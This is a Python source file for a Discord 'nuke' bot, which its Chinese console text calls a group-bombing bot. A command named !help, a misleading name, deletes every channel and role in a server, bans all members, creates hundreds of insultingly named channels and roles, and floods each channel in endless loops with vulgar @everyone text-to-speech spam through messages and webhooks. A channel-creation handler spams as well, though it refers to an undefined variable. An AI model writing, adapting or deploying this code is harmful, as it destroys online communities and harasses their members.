import discord
from discord.ext import commands
from discord.commands import slash_command


intents = discord.Intents().all()
bot = commands.Bot(command_prefix='!',intents = intents)
token = ""

@bot.event
async def on_ready():
    print(f"您的炸群機器人{bot.user}已準備")
    print("請使用 !help 進行轟炸")


@bot.command()
async def help(ctx):
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            pass
    for role in ctx.guild.roles:
        try:
            await role.delete()
        except:
            pass
    for member in ctx.guild.members:
        try:
            await member.ban()
        except:
            pass
    for i in range(1, 500):
        try:
            await ctx.guild.create_text_channel(name="e04-nuke-you")
            await ctx.guild.create_role(name = "垃圾群組")
        except:
            pass
    for channel in ctx.guild.channels:
        webhook = await channel.create_webhook(name="e04 吃雞雞")
        while True:
            await channel.send(f"@everyone@here\n吃我雞巴",tts=True)
            await webhook.send(f"@everyone@here\n吃我雞巴",tts=True)

@bot.event
async def on_guild_channel_create(channel):
  
    webhook = await channel.create_webhook(name="幹垃圾群組")
    while True:
        await channel.send(f"@everyone@here\n{message}",tts=True)
        await webhook.send(f"@everyone@here\n{message}",tts=True)

bot.run(token)
